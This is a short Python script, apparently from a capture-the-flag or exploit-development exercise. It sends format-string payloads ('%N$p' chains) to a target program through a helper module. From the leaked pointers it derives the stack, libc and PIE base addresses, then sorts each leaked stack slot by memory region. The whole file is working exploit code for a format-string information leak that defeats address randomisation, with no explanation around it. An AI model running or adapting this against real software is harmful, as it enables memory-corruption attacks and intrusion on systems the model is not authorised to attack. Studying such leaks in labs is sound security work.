import re,sys
from rprobe import run
LIBC_RET=0x29ca8; PIE_MAIN=0x1169
def cls(x, rbp, libc, pie):
    if x=='(nil)': return 'nil'
    y=int(x,16); d=y-rbp
    if abs(d)<0x4000: return 'STACK %+#x'%d
    if libc and libc<=y<libc+0x1f4000:
        off=y-libc
        tag='libc.text' if off<0x18b000 else ('libc.rodata' if off<0x1dfb30 else ('libc.data' if off<0x1f3e50 else 'libc.pad'))
        return '%s+%#x'%(tag,off)
    if libc and libc+0x1f4000<=y<libc+0x400000:
        return 'AFTERLIBC+%#x'%(y-libc)
    if pie and pie<=y<pie+0x5000: return 'PIE+%#x'%(y-pie)
    if y>0x7f0000000000 and y<0x800000000000: return 'mmap?%#x'%y
    return x
for k in range(16,92,2):
    grp=[6,39,21,k,k+1]
    fmt=''.join('%%%d$p.'%g for g in grp)[:-1]
    if len(fmt)>31: break
    try:
        lk,out=run('1',fmt,'B')
        v=re.findall(r'0x[0-9a-f]+|\(nil\)',out)
        if len(v)<5: print(k,'SHORT',v); continue
        argv=int(v[0],16); rbp=argv-0x108
        libc=int(v[1],16)-LIBC_RET; pie=int(v[2],16)-PIE_MAIN
        print('arg%-3d=%-14s  arg%-3d=%s'%(k,cls(v[3],rbp,libc,pie),k+1,cls(v[4],rbp,libc,pie)))
    except Exception as e: print(k,'ERR',e)
